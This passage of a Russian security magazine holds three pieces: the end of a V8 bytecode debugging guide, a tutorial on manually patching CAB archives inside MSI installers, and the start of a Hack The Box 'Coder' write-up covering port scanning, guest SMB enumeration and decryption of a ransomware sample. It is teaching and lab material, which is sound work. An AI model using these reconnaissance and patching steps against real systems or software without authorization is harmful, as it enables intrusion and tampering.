00007FF6BFE4BCDA | 4D:8BBD A8450000 | mov r15,qword ptr ds:[r13+45A8]
// r12 — указатель на байт-код метода; r9 — программный счетчик
// r9 — текущий опкод
00007FF6BFE4BCE1 | 47:0FB6140C      | movzx r10d,byte ptr ds:[r12+r9]
// Таблица обработчиков опкодов
00007FF6BFE4BCE6 | 4B:8B0CD7        | mov rcx,qword ptr
ds:[r15+r10*8]
// Вызов обработчика опкода
00007FF6BFE4BCEA | FFD1             | call rcx
// Восстановить указатель на байт-код
00007FF6BFE4BCEC | 4C:8B65 E0       | mov r12,qword ptr ss:[rbp-20]
// Восстановить zigzag-coded программный счетчик
00007FF6BFE4BCF0 | 44:8B4D D8       | mov r9d,dword ptr ss:[rbp-28]
00007FF6BFE4BCF4 | 41:D1E9          | shr r9d,1
// bl — текущий байт-код
00007FF6BFE4BCF7 | 43:0FB61C0C      | movzx ebx,byte ptr ds:[r12+r9]
00007FF6BFE4BCFC | 4D:8BC1          | mov r8,r9
// Указатель на количество параметров
00007FF6BFE4BCFF | 49:8B8D 281B0000 | mov rcx,qword ptr ds:[r13+1B28]
00007FF6BFE4BD06 | 80FB 03          | cmp bl,3
// Если команда не префикс — переход
00007FF6BFE4BD09 | 77 1D            | ja 7FF6BFE4BD28
// Следующий байт за префиксом
00007FF6BFE4BD0B | 41:FFC1          | inc r9d
// Префикс Wide или ExtraWide?
00007FF6BFE4BD0E | F6C3 01          | test bl,1
// Получаем опкод, следующий за префиксом
00007FF6BFE4BD11 | 43:0FB61C0C      | movzx ebx,byte ptr ds:[r12+r9]
00007FF6BFE4BD16 | 75 09            | jne 7FF6BFE4BD21
// Префикс Wide — смещение в таблице параметров +0xC6
00007FF6BFE4BD18 | 48:81C1 C6000000 | add rcx,C6
00007FF6BFE4BD1F | EB 07            | jmp 7FF6BFE4BD28
// Префикс ExtraWide — смещение в таблице параметров +0xC6
00007FF6BFE4BD21 | 48:81C1 8C010000 | add rcx,18C
// Выход из метода, если опкод Return
00007FF6BFE4BD28 | 80FB A9          | cmp bl,A9
00007FF6BFE4BD2B | 0F84 1D000000    | je 7FF6BFE4BD4E
// Выход из метода, если опкод SuspendGenerator
00007FF6BFE4BD31 | 80FB AF          | cmp bl,AF
00007FF6BFE4BD34 | 0F84 14000000    | je 7FF6BFE4BD4E
// Если опкод JumpLoop, то никуда не двигаться
00007FF6BFE4BD3A | 80FB 89          | cmp bl,89
00007FF6BFE4BD3D | 75 05            | jne 7FF6BFE4BD44
00007FF6BFE4BD3F | 4D:8BC8          | mov r9,r8
00007FF6BFE4BD42 | EB 08            | jmp 7FF6BFE4BD4C
// r10 — количество параметров команды
00007FF6BFE4BD44 | 44:0FB61419      | movzx r10d,byte ptr
ds:[rcx+rbx]
// Сдвигаем программный счетчик на него и переходим к обработке
следующего опкода
00007FF6BFE4BD49 | 45:03CA          | add r9d,r10d
00007FF6BFE4BD4C | EB 8C            | jmp 7FF6BFE4BCDA
00007FF6BFE4BD4E | 48:8B5D E0       | mov rbx,qword ptr ss:[rbp-20]
...

Как видишь, отсю да мож но получить длины всех обрабаты ваемых интерпре-
татором опкодов. Для начала чуть про ясню, что такое префиксы Wide
и ExtraWide и почему на опко ды с ними положе ны разные таблицы. Как ска-
зано в упомянутой мной статье, в зависимос ти от длины опе рандов каж дая
инструкция име ет три варианта — обычный (1-бай товые операнды), Wide (2-
бай товые опе ранды) и ExtraWide (4-бай товые операн ды). В новой версии
добави лось еще два префикса — отладочные, соответс твенно, тоже в вари-
антах Wide и ExtraWide.
  Попробуем вытащить мнемони ку новой системы команд. Конеч но же,
интерпре татор содержит таблицу внутренних имен всех инс трукций, ведь они
нуж ны для отладоч ной печати при обработке оши бок. Нем ного покурив код
обработ чиков таких ошибок в IDA, натыкаемся на такой сложный case,
в котором каждому опко ду соот ветству ет имя инструк ции:


...
.text:00144A71AE0   cmp     cl, 0C5h            ; switch 198 cases
.text:00144A71AE3   ja      def_144A71B01       ; jumptable
0000000144A71B01 default case
.text:00144A71AE9   lea     rax, aWide_0        ; "Wide"
.text:00144A71AF0   movzx   ecx, cl
.text:00144A71AF3   lea     rdx, jpt_144A71B01
.text:00144A71AFA   movsxd  rcx, ds:(jpt_144A71B01 -
144A72130h)[rdx+rcx*4]
.text:00144A71AFE   add     rcx, rdx
.text:00144A71B01   jmp     rcx                 ; switch jump


.text:00144A71B03   loc_144A71B03:              ; CODE XREF: sub_
144A71AE0+21↑j
.text:00144A71B03   lea     rax, aExtrawide     ; jumptable
0000000144A71B01 case 1


.text:00144A71B0A   locret_144A71B0A:           ; CODE XREF: sub_
144A71AE0+21↑j
.text:00144A71B0A   retn                        ; jumptable
0000000144A71B01 case 0


.text:00144A71B0B   loc_144A71B0B:              ; CODE XREF: sub_
144A71AE0+21↑j
.text:00144A71B0B   lea     rax, aDebugbreak4   ; jumptable
0000000144A71B01 case 8
.text:00144A71B12   retn
...

Итого у нас есть 198 инструкций байт-кода с мнемониками и дли ной для каж-
дого из них.





Как мы уже знаем из статьи Positive Technologies, эти инструкции делятся
на сле дующие группы:
 • заг рузка/запись в аккумулятор;
 • работа с регистрами;
 • математика;
 • булевы опе рации;
 • сдвиговые, мно гоцелевые встроенные инструкции;
 • инструкции сравнения;
 • соз дание объектов;
 • условные переходы;
 • цик лы;
 • инструкции генера ции исключений;
 • инструкции отладки;
 • вет вле ния.

Ес ли срав нить с таблицей инструкций вер сии 8.16.0 в упомяну той выше
статье, система команд претер пела очень серь езные изме нения: добави лось
два пре фик са, общее количество команд увеличи лось сo 167 до 198, причем
некоторые из них (например, StackCheck) были убраны. Хотя мы пока только
догады ваемся о формате вызова и назначении каждой команды, их легко
можно разобрать, исследовав реализацию обработ чиков (ведь таблица их
адресов у нас име ется).
   Эта информация представляет собой неп лохой задел для допиливания
плагина от Positive Technologies или даже для написа ния собственного деком-
пилятора, но предоставляю читателям заниматься этим самостоятельно, пос-
кольку цель у нас дру гая — научить ся исследовать это приложение в отладчи-
ке.
   Те перь неп лохо бы разоб раться, в каком мес те прог раммы мы находимся
(стек вызовов, име на клас сов и методов и так далее). Перечисленные данные
у программы есть стопроцентно, ведь при возникно вении ошибки она радос-
тно отправ ляет этот стек вызовов в лог и кон соль в следующем виде:


 at Decipher.createCipherBase (node:internal/crypto/cipher:114:19)
 at Decipher.createCipher (node:internal/crypto/cipher:127:3)
 at new Decipher (node:internal/crypto/cipher:273:3)
 at Object.createDecipher (node:crypto:142:10)
 at Object.deprecated (node:internal/util:124:12)
 at EncryptStorage.decryptString (evalmachine.<anonymous>:1:10466)
 at EncryptStorage.loadDataFile (evalmachine.<anonymous>:1:11003)
 at new EncryptStorage (evalmachine.<anonymous>:1:9839)
 at Object.<anonymous> (evalmachine.<anonymous>:1:11423)
 at Module._extensions.<computed> [as .jsc] ( C:\Program Files\E
lectron\resources\app.asar\node_modules\bytenode\index.js:220:26)

Процедуру распечатки стека вызовов мы также находим в обработчике оши-
бок. В V8 существует целый занимающий ся этим класс StackTrace, он име-
ется в исходни ках Node и неп лохо задоку ментирован, поэтому правильно
было бы начать иссле дование с его разбора. Однако сво бодного времени
у нас не так мно го, а любопытство распирает, поэтому пойдем более быс-
трым путем.
   Когда мы разбирали цикл интерпретатора, я в комментариях заметил, что
регистр r12 указывает на байт-код метода. Ты, навер ное, подумал, что име-
ется в виду ука затель на первый опкод метода, но это не сов сем так.
На самом деле име ется в виду объект в памяти, в который загружен байт-код
метода. Выглядит он вот так.





На скрин шоте вид но, что это байт сигнатуры объекта 0x2A (выделено крас-
ным), то есть объект содержит байт-код метода. Несмотря на то что програм-
мный счетчик отсчитывает смещение от начала обь екта, собс твенно байт-код
начинается только со смещения 0x21 (выделено зеленым) Нас же интересу-
ет 32-битное слово 0x00423401 по сме щению 7 от начала объекта. Прибавим
к нему базу фрейма 0x1AC00000000 и перейдем по полученному смещению.





Вроде бы ничего примеча тельного, одна ко сиг натура объ екта 0x22 (выделе-
но красным) озна чает, что объект содер жит текстовую стро ку. Где же сама
тек стовая стро ка? Если ты прочитал статью Positive Technologies, то пом нишь:
когда объект уже был сери ализован и встре чается снова, то в бинарном
потоке такой объект не дуб лируется, а записывается как ссылка на его пер-
вое вхож дение. И эта ссылка будет числом — смещением в куче (такая тех-
ника называется Pointer Compression, ког да ука затель можно записать в виде
сме щения отно сительно базы). А потому не расс траиваемся, а снова берем
слово по сме щению 7 от начала объекта (выделено синим) и еще разок про-
делы ваем над ним ту же операцию, что бы получить сме щение до сле дующе го
объ екта.





На этот раз удача на нашей стороне: полученный объ ект действительно
содержит строку (выделено зеленым) со счетчиком (выделено синим). Это и
есть имя нашего метода — getOptions.
   Итак, имя исполняемо го метода у нас есть, поп робу ем теперь разобрать
стек вызовов, не связыва ясь со StackTrace.





Видно, что при каж дом вызове интерпретатора адрес содержащего байт-код
объ екта (выделе но красным) сохраняется в локальной переменной +0x28
от адре са воз врата, а текущее смещение в нем (выделено зеленым) —
в локальной переменной +0x30 от адреса воз врата.
  Подведем ито ги того, чему мы научились в этой статье. Теперь мы,
при известной сно ровке, можем использовать x64dbg как пол ноценный
отладчик бинарного JSC-кода любой вер сии: при про изволь ном останове
определяем текущее место вызова в исходном коде JavaScript и последова-
тель ность вызовов, с помощью которой мы к нему пришли. Уста навливаем
брейк-пойнты на условные и безус ловные переходы, методы и обращения
к литералам с пос ледующей трассировкой байт-кода и заходами в методы.
А затем правим байт-код на лету пря мо в загружен ном в память виде с пос-
ледующим переносом в исходник.
  И самое глав ное — не боги горшки обжи гают: каждый при желании может
самос тоятельно  получить дос таточно информа ции и  допилить  готовые
решения до пол ноценного декомпилятора любой версии байт-кода.
ВЗЛОМ





MSI — самый популярный формат инстал-
ляторов. Для редактирования таких уста-
новоч ных пакетов придумано мно го удоб-
ных инс трументов, но они могут не сра-
ботать, если инсталлятор содержит набор           МВК
CAB-архивов. Сегодня я расска жу, как пра-
вить  данные   внутри  инсталляционных
пакетов MSI в ручном режиме, если дру-
гими спо собами сделать это не получается.


В сво их статьях я пери оди чески поднимаю тему разборки и патча инстал-
ляци онных пакетов. На этот раз я хочу продолжить тему, начатую в статье «Ло-
маем инсталлятор. Как обмануть инсталлятор MSI методом для ленивых», —
руч ной патчинг нестандартных MSI-пакетов, редактировать которые традици-
онными средствами невозможно. В той статье мы раз бирали правку и замену
установоч ного скрипта, а сейчас попробуем поменять данные в инстал лиру-
емых файлах.
   Итак, нам нужно внести изменения в инсталлятор MSI, например заменить
в нем один содер жащийся в CAB-архиве файл другим. В связи с востре-
бованностью задачи умные люди при дума ли мно жество редакторов MSI-
пакетов разной степени прод винутости: Advanced Installer, Master Packager,
Orka, MSI Editor и другие. Из них лично я особо выделил бы Master Packager:
этот редактор, на мой взгляд, наиболее коррек тно выпол няет разборку,
редак тирова ние и пересохранение MSI-пакетов различной сложности.
  Перечисленные ути литы обладают удоб ным и дру жественным интерфей-
сом, позволяющим даже неопытному пользователю сесть и без подготовки
прос то редактировать фай лы, таб лицы и про чую логику инстал ляционного
про цесса. Собствен но, на этом моменте и можно было бы закончить статью,
но, к сожалению, в мире нет совер шенства. Иног да попадаются MSI-пакеты,
которые нельзя прос то так взять и открыть, отредактировать и пересохранить
с использовани ем подобного редактора, не нарушив их работоспособность.
  Причем разобрать пакет на составляющие его фай лы и таблицы — как раз
задача несложная, проб лемы начинаются имен но в процес се переком-
пиляции пат ченно го файла. В принципе, вытащить фай лы из инстал лятора
(как я уже писал в статье «Ломаем инсталлятор. Как обмануть инсталлятор
MSI методом для ленивых») можно и без спец средств — прак тичес ки любой
нор мальный архи ватор (7-Zip, WinRAR и другие) откры вает MSI, как архив.
  С помощью архи вато ра можно извлечь оттуда составля ющие уста новоч-
ный пакет CAB-фай лы, а они, в свою очередь, так же открываются многими
архивато рами (собирать CAB из сос тавляющих умеют такие программы,
как  PowerArchiver,  ACDzip  или  спе циализиро ванный  Cabarc). О  том,
как засунуть исправленный CAB обратно в MSI, я расскажу позже.
  В конце концов, можно разложить MSI на составля ющие фай лы, минуя
про межуточ ные CAB, просто запустив msiexec с ключом /a (при этом соз-
дается папка со всем содержимым пакета MSI). Есть еще более прод винутый
спо соб — натравить на инсталляци онный пакет ути литу с откры тым исходным
кодом msi2xml. Она запускается следующей командой:


msi2xml -c files installation.msi

При этом в каталог files распакуются все файлы проекта из составляющих
его CAB, а также создас тся файл полного опи сания проекта installation.
msi со все ми таб лицами и логикой про цес са установки. С использованием
этого фай ла становится возможным собрать инсталлятор командой


xml2msi -m installation.xml

Такая низкоуровневая операция помогает, если не работают описанные
выше методы. Но, к сожале нию, пересоб ранный подобным способом инстал-
лятор тоже не всег да оказывается работоспособным. Действитель но, бывают
слу чаи, когда авто мати зиро ванные спо собы не сра баты вают. Например, если
у нас име ется многотомный непрерывный архив, в середи не которого нужно
поменять один файл, не трогая остальную структуру. По традиции я рас скажу,
как руками пропатчить файл в CAB-архи ве без его пол ной перепаков ки.
  Первым делом, как обычно, изучим специфи кацию. Попробуем разобрать
написанное  там  на  примере  готово го многотом ного  архи ва.  Начнем
с заголов ка фай ла.





Распишем эту структуру поподробнее:


struct CFHEADER
{
  // 1 красный — сигнатура файла MSCF
  u1  signature[4]
  u4  reserved1
  // 2 желтый — размер файла в байтах
  u4  cbCabinet
  u4  reserved2
  // 3 зеленый — смещение до первой записи CFFILE
  u4  coffFiles
  u4  reserved3
  // 4 голубой — minor-байт версии файла
  u1  versionMinor
  // 5 фиолетовый — major-байт версии файла
  u1  versionMajor
  // 6 белый — количество записей CFFOLDER в файле
  u2  cFolders
  // 7 черный — количество записей CFFILE в файле
  u2  cFiles
  // 8 оранжевый — флаги формата: 3 = 1 (cfhdrPREV_CABINET у файла
есть предыдущий том) | 2 (cfhdrNEXT_CABINET у файла есть следующий
том)
  u2  flags
  // 9 желтый — ID кабинета, один и тот же у всех томов архива
  u2  setID
  // 10 красный — порядковый номер данного тома
  u2  iCabinet;
  // Эти поля не обязательны и в архиве не присутствуют, поскольку
бит 2 поля flags не установлен
  u2  cbCFHeader;
  u1  cbCFFolder;
  u1  cbCFData;
  u1  abReserve[];
  // 11 зеленый — необязательное имя предыдущего тома, строка,
заканчивающаяся 0, в нашем случае Data1.cab
  u1  szCabinetPrev[];
  // 12 белый — необязательное имя предыдущего диска, в нашем случае
пустое
  u1  szDiskPrev[];
  // 13 фиолетовый — необязательное имя следующего тома, в нашем
случае Data12.cab
  u1  szCabinetNext[];
  // 14 белый — необязательное имя следующего диска, в нашем случае
пустое
  u1  szDiskNext[];
};

Что бы поменять файл в архиве, надо для начала его найти. В этом плане нам
интересен массив записей CFFILE. Каж дая из записей в этом массиве
содержит дан ные о файле, хранящемся в архи ве. На начало мас сива ука-
зывает поле coffFiles. Посмотрим, как оно выг лядит в реальном фай ле.





Распишем под робно и эту структуру:


struct CFFILE
{
  // 1 красный — размер распакованного файла в байтах
  u4  cbFile;
  // 2 желтый — смещение до начала файла в распакованном блоке folder
  u4  uoffFolderStart;
  // 3 зеленый — номер структуры CFFOLDER, содержащей данные файла в
общей таблице folder’ов
  // В этом примере равно ifoldCONTINUED_FROM_PREV (0xFFFD)
  u2  iFolder;
  // 4 желтый — дата создания файла
  u2  date;
  // 5 фиолетовый — время создания файла
  u2  time;
  // 6 голубой — атрибуты файла
  u2  attribs;
  // 7 оранжевый — имя файла, заканчивающееся нулем
  u1  szName[];
};

Настало время пояснить нес колько моментов. Ты, видимо, уже обра тил вни-
мание, что не все содержащиеся внутри CAB-архива фай лы име ют свои ори-
гинальные име на. Скажем так, практически все файлы, содер жащиеся внутри
архива CAB, используют некие промежуточ ные «техничес кие» име на, чтоб
нам жизнь медом не казалась. В этом можно убедиться, открыв CAB-файл
в любом под держивающем данный формат архивато ре. По сути, «техничес-
кие» име на — это сокращенный GUID, который инстал лятор присваивает каж-
дому файлу в пакете.
  Соответствие оригиналь ных и «технических» имен можно посмотреть
в таб лице File инсталлятора, открыв MSI-пакет в каком-нибудь редак торе,
нап ример Orka. Обрати вни мание на то, что один и тот же файл может при-
сутствовать в пакете несколько раз, нап ример если он устанав лива ется
в разные каталоги. Поэтому внимательно прос мотри эту таблицу и най ди все
вхождения нужного файла, а так же соот ветс твующие внут ренние име на
и CAB’ы для них перед тем, как приступить к редак тированию.
   Итак, нам извес тны внутреннее имя целево го файла и CAB, который его
содержит. Поп робу ем описать алго ритм поиска соот ветс тву ющей ему струк-
туры CFFILE на язы ке C#:


// stream — источник данных файла CAB, в заголовке которого по
смещению 0x10 содержится coffFiles
stream.Seek(0x10, SeekOrigin.Begin);
BinaryReader r = new BinaryReader(stream);
// Считываем его
int coffFiles = r.ReadInt32();
// Общее количество файлов cFiles по смещению 0x1C
stream.Seek(0x1C, SeekOrigin.Begin);


// Читаем и его
int cFiles = r.ReadInt16();
// Переходим по смещению coffFiles к таблице CFFILE
stream.Seek(coffFiles, SeekOrigin.Begin);


// Перебираем в цикле все файлы внутри этого cab
for (int i=0;i<cFiles;i++)
{
  // Считываем размер файла
  int cbFile = r.ReadInt32();
  // Считываем смещение до начала файла в распакованном блоке folder
  int uoffFolderStart = r.ReadInt32();
  // Считываем номер структуры CFFOLDER, содержащей данные файла
  int iFolder = r.ReadInt16();
  // Считываем дату создания файла
  int int date = r.ReadInt16();
  // Считываем время создания файла
  int time = r.ReadInt16();
  // Считываем атрибуты файла
  int attribs = r.ReadInt16();
  var builder = new StringBuilder();
  while (true)
  {
    // Посимвольно считываем имя файла, пока не попался нулевой байт
конца строки,
    // и собираем из считанных символов строку
    char c = r.ReadChar();
    if (Convert.ToByte(c)!=0) builder.Append(c); else break;
  }
  if (builder.ToString()==fileName)
  {
    // Мы нашли элемент CFFILE, соответствующий заданному fileName,
    // переходим к следующему этапу
  ...
  }
}

На сле дующем этапе возникает проб лема: вмес то ожидаемых данных файла
у нас есть номер какой-то непонятной струк туры CFFOLDER, который внезапно
еще и может быть отрицатель ным. Путаницу вносит сам термин folder, упо-
минаемый в специфи кации формата. В данном контексте это не каталог,
в котором хранится файл, а непрерывный блок дан ных с содержимым нашего
файла, который упаковы вается в архив. Он может включать как один файл
(обычно так и бывает, тогда в заголов ке количество фолдеров cFolders
и количество файлов cFiles совпадают), так и несколько файлов, что сильно
не нравится большинству архи ваторов.
  Более того, в случае многотом ного архива один folder может резаться
на части, перехо дя с одного тома на следующий. В этом случае его начало,
будучи логически последним фолдером в списке, в блоке CFFILE станет мар-
кировать ся как ifoldCONTINUED_TO_NEXT (0xFFFE=-2), а конец — соответс-
твен но,  пер вый  CFFOLDER  следующего  тома —  будет  иметь  номер
ifoldCONTINUED_FROM_PREV  (0xFFFD=-3). Это мы и видели в примере
выше — первый CFFOLDER не пер вого тома в цепоч ке.
  Однако есть и более упо ротый случай, когда folder начинается и закан-
чивается в других томах. Тог да он является единствен ным фол дером в томе
и маркируется как ifoldCONTINUED_PREV_AND_NEXT (0xFFFF=1). По понят-
ным причинам такие фолдеры невозможно рас паковать и перепаковать
при наличии толь ко одного тома, и этим и объясняется нелюбовь архивато-
ров к неп рерывным многотомным кабинетным архивам. В нашей статье мы
не будем заморачиваться подобными экстре маль ными случаями и пред-
положим, что содержащий нужный нам файл folder все-таки целиком содер-
жится внутри данного тома CAB. Проанализируем структуру CFFOLDER с пер-
вого скриншота.


struct CFFOLDER
{
  // 15 красный — смещение до структуры CFDATA
  u4  coffCabStart;
  // 16 желтый — количество блоков CFDATA в фолдере
  u2  cCFData;
  // 17 зеленый — тип компрессии
  u2  typeCompress;
  // Это поле в нашем примере отсутствует,
  // поскольку соответствующий бит сброшен в поле flags заголовка
файла
  u1  abReserve[];
};

По хоже, и эта структура отсы лает нас к массиву следующих структур, на этот
раз называющихся CFDATA. А все потому, что при достаточно жестких огра-
ниче ниях на размер упаковываемого блока (16 бит, но на самом деле обычно
не боль ше 0x8000) данные приходится резать на множество мел ких блоков,
каждый из которых в заголовке содержит следующую структуру. Рассмотрим,
как она выглядит.





struct CFDATA
{
  // 1 оранжевый — контрольная сумма данного блока CFDATA
  u4  csum;
  // 2 зеленый — длина упакованного блока в байтах
  u2  cbData;
  // 3 желтый — длина распакованного блока в байтах
  u2  cbUncomp;
  // Это необязательное поле в нашем примере отсутствует,
  // поскольку соответствующий бит сброшен в поле flags заголовка
файла
  u1  abReserve[];
  // Упакованные данные блока
  u1  ab[cbData];
};

Кон трольная сумма блока по спецификации представ ляет собой тупой XOR
всех данных бло ка, начиная со следующе го от csum байта и до конца блока
ab, разбитого на 32-битные слова. Приведу его код на С, взятый из специфи-
кации:


CHECKSUM CSUMCompute(void *pv, UINT cb, CHECKSUM seed)
{
  // Количество 32-битных слов в блоке
  int     cUlong;
  // Аккумулятор контрольной суммы
  CHECKSUM  csum;
  BYTE     *pb;
  ULONG     ul;


  // Количество целых 32-битных слов в блоке
  cUlong = cb / 4;
  // seed обычно равен 0
  csum = seed;
  // Начало блока данных
  pb = pv;



  while (cUlong-- > 0) {


    // Начинаем с младшего байта
    ul = *pb++;
    // 2 байта
    ul |= (((ULONG)(*pb++)) <<  8);
    // 3 байта
    ul |= (((ULONG)(*pb++)) << 16);
    // 4 байта
    ul |= (((ULONG)(*pb++)) << 24);


    // Выполняем XOR аккумулятора с полученным словом
    csum ^= ul;
  }


  // Добавляем данные неполного слова в конце блока
  ul = 0;
  switch (cb % 4) {
    case 3:
      // 3 байта
      ul |= (((ULONG)(*pb++)) << 16);
    case 2:
      // 2 байта
      ul |= (((ULONG)(*pb++)) <<  8);
    case 1:
      // и самый младший байт
      ul |= *pb++;
    default:
      break;
  }
  // Выполняем XOR аккумулятора с полученным неполным словом
  csum ^= ul;


  return csum;
}

Впро чем, мож но даже не заморачиваться с вычислением контрольной суммы
каждого блока. Дело в том, что если поле csum в блоке равно 0, то инстал-
лятор прос то игнорирует его проверку. В общем, если нам надо получить все
данные фолдера myFolder, перебрав составляющие его блоки CFDATA, алго-
ритм на язы ке C# будет выглядеть следующим образом:


// Перейдем по смещению myFolder*0x8 относительно конца заголовка
файла
stream.Seek(myFolder*0x8+endHeader, SeekOrigin.Begin);
// coffCabStart — смещение до первого блока CFDATA, относящегося к
myFolder
long coffCabStart = r.ReadInt32();
// cCFData — количество блоков CFDATA, относящегося к myFolder
int cCFData = r.ReadInt16();
// typeCompress — тип компрессии: 0 — без компрессии; 1 — MSZIP; 2 —
Quantum; 3 — LZX
int typeCompress = r.ReadInt16();
stream.Seek(coffCabStart, SeekOrigin.Begin);
// Цикл по всем блокам фолдера
for (int i=0;i< cCFData;i++)
{
   // Считать контрольную сумму блока
   int csum = r.ReadInt32();
   // Считать размер упакованных данных
   UInt16 cbData= r.ReadUInt16();
   // Считать размер распакованных данных
   UInt16 cbUncomp= r.ReadUInt16();
   // Считать упакованные данные в buf
   byte[]buf=r.ReadBytes(cbData+2);
}

Дальнейшая стратегия замены выг лядит следующим образом. Получив все
файлы, содер жащиеся в одном фолдере с искомым, мы в своей программе
скле иваем их в том же порядке, в котором они следуют в блоках CFFILE.
Затем полученный блок режем на фраг менты раз мером 0x8000 байт, которые
записы ваем в CAB-файл в виде цепоч ки CFDATA, соот ветствующей искомому
фолдеру. С компрессией мож но не заморачиваться, уста новив значение поля
фолдера в 0.
  В этом случае поля cbData и cbUncomp каж дого блока CFDATA будут иметь
оди наковые значения, а контроль целостнос ти бло ка подав ляет ся установкой
поля csum в 0. Если при замене фай ла его размер не меняется, то все зна-
чения полей uoffFolderStart структур CFFILE сохраня ются. Остается толь-
ко исправить смещение на новую цепочку CFDATA в coffCabStart, указать
новое количество бло ков в cCFData и новый раз мер фай ла cbCabinet
в заголовке.
  Саму новую цепоч ку CFDATA про ще дописать в конец файла, чтобы
не возиться с пересчетом смещений coffCabStart в остальных фолдерах,
и это будет самый скорос тной способ правки CAB, даже если он занимает
несколько гигабайт.
   Ну вот, мы пропатчили CAB-файл без полной перепаковки архива, но как
нам засунуть его обратно в MSI? По счастью, на этот раз не придется плясать
с бубном вок руг WinHex. В пакете Windows SDK для разработчиков установ-
щика Windows есть полезная утилита командной строки Msidb.exe. При уста-
новке Windows SDK эта утилита обычно находится вот в таком подкаталоге:


C:\Program Files (x86)\Windows Kits\10\bin\<версия SDK>\x86\

Под робнее про нее можно почитать на сай те Microsoft, нас же интересуют
только две ее функции. В терминах Microsoft CAB-файл является потоком
данных, содер жащимся в базе данных MSI. Для замены потока Data11.cab
из нашего примера мы должны для начала уда лить этот поток из базы сле-
дующей командой:


MsiDb.exe -d MyMSI.msi -k Data11.cab

Затем добав ляем его туда из файла:


MsiDb.exe -d MyMSI.msi -a Data11.cab

Ес ли первая коман да выполняется почти мгно венно, то вторая отрабаты вает
достаточно длительное вре мя, ничем не сиг нализи руя о своем завершении,
кроме раз ве что блокировки целево го MSI-файла. Одна ко при ее успешном
выполнении (а ошибку, если она возникнет в процессе выполнения, прог-
рамма все-таки покажет) мы получаем вполне рабочий пропатченный MSI-
файл, готовый к уста новке.
   Итак, мы научи лись править данные инсталляционных пакетов MSI хоть
в автомати ческом, хоть в ручном режиме. Наде юсь, этот навык поможет тебе
в нестандартных ситу ациях.
ВЗЛОМ





В этом райтапе я покажу про цесс ревер-
синга  вируса-шиф ровальщика,  написан-
ного на C#. Потом мы обойдем двухфактор-
ную аутентифика цию в TeamCity и получим
RCE.    Затем    применим     технику             RalfHacker                                                                                             hackerralf8@gmail.com
ESC5 для повышения привиле гий через
мис конфиг  службы  сертификации  Active
Directory.


Наша конечная цель — захват рута на машине Coder с площадки Hack
The Box. Уровень ее сложности — «безум ный».




                     Под ключать ся к машинам с HTB рекомендуется
                        только через VPN. Не делай этого с компьютеров,
                        где есть важ ные для тебя данные, так как ты ока-
                    жешься в общей сети с другими учас тниками.



ÐÀÇÂÅÄÊÀ

Ñêàíèðîâàíèå ïîðòîâ
Добав ляем IP-адрес машины в /etc/hosts:


10.10.11.207    coder.htb

И запускаем сканиро вание портов.




Сканиро вание портов — стандар тный первый шаг при любой атаке. Он поз-
воля ет атакующе му узнать, какие службы на хосте при нимают соединение.
На осно ве этой информации выбирается следующий шаг к получению точки
входа.
  Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи сле дующе го скрипта:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '\n' ',' | sed s/,$//)
 nmap -p$ports -A $1


Он действует в два этапа. На первом про изво дится обычное быс трое ска-
нирование, на вто ром — более тщательное сканиро вание, с исполь зовани ем
име ющих ся скрип тов (опция -A).





                    Резуль тат работы скрипта

Сканер нашел множество открытых портов. Несложно заметить, что мы име-
ем дело с Windows.
 • 53 — служба DNS;
 • 80 (HTTP) — веб-сервер Microsoft IIS/10.0;
 • 88 — служба Kerberos;
 • 135 — служба удаленного вызова про цедур (Microsoft RPC);
 • 139 — служба сеан сов NetBIOS, NetLogon;
 • 389 — служ ба LDAP;
 • 443 (HTTPS) — веб-сер вер Microsoft IIS/10.0;
 • 445 — служба SMB;
 • 464 — служба сме ны пароля Kerberos;
 • 593 (HTTP-RPC-EPMAP) — использует ся в служ бах DCOM и MS Exchange;
 • 636 — LDAP с шиф рованием SSL или TLS;
 • 5985 — служба удаленного управления WinRM;
 • 9389 — веб-служ бы AD DS.

LDAP рас крывает имя домена и хоста, которые сразу добавляем в файл /
etc/hosts.


10.10.11.207 coder.htb dc01.coder.htb

Те перь про веряем доступ к службе SMB от име ни гос тевого пользовате ля
и  получаем  спи сок  общих  ресурсов.  Для  это го  используем  утилиту
CrackMapExec.


cme smb 10.10.11.207 -u 'guest' -p '' --shares





                     Об щие ресурсы

Есть  нес колько  интересных  катало гов,  но  первым  делом  заглянем
в Development.


ÒÎ×ÊÀ ÂÕÎÄÀ

Под клю чаемся к ресурсу SMB с помощью скрипта smbclient из набора
impacket.


impacket-smbclient 'guest@10.10.11.207'
use Development





                 Содержимое общих ресурсов

В ито ге нам доступно очень много файлов, поэтому лучше скопировать все
на локальный хост и затем проанализировать.


smbclient //10.10.11.207/Development -N
recurse on
prompt off
mget *





                   Рекурсивная заг рузка фай лов

Наибо лее интерес ны исполняемый файл-шиф ровальщик и, видимо, зашиф-
рованный файл.





             Содержимое каталога Temporary Projects

Программа написана на C#, а значит, исполняемый файл можно деком-
пилиро вать с помощью dnSpy.





                   Ис ходный код класса Main

Таким образом, файлы шифруют ся при помощи клю ча и вектора ини циали-
зации (стро ки 21–26). В качестве сида для фун кции Random использует ся
текущее вре мя, а это значит, что ключ и вектор ини циали зации неслучайны.
Мы можем немного перепи сать программу для рас шифровки файла, а вре мя,
когда файл был зашиф рован, определим по дате его создания.





                  Содержимое SMB-ресурса

Для перевода вре мени  в формат UNIX вос пользуем ся сай том Epoch
Converter. Указываем дату (с учетом временной зоны) и получаем число
для инициализации функции Random.





                   По лучение сида Random

Те перь можем переписать код, который поможет расшифровать файл.


using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;


namespace Decryptor
{
 class Program
 {
   static void Main(string[] args)
   {
    FileInfo fileInfo = new FileInfo(args[0]);
    string destFile = Path.ChangeExtension(fileInfo.Name, ".dec");
    long value = 1668205028; // DateTimeOffset.Now.
ToUnixTimeSeconds();
    Random random = new Random(Convert.ToInt32(value));
    byte[] array = new byte[16];
    random.NextBytes(array);
    byte[] array2 = new byte[32];
    random.NextBytes(array2);
    byte[] array3 = Program.EncryptFile(fileInfo.Name, destFile,
array2, array);
   }


   private static byte[] EncryptFile(string sourceFile, string
destFile, byte[] Key, byte[] IV)
   {
    using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
    {
     using (FileStream destFileStream = new FileStream(destFile,
FileMode.Create))
     {
       using (ICryptoTransform cryptoTransform = rijndaelManaged.
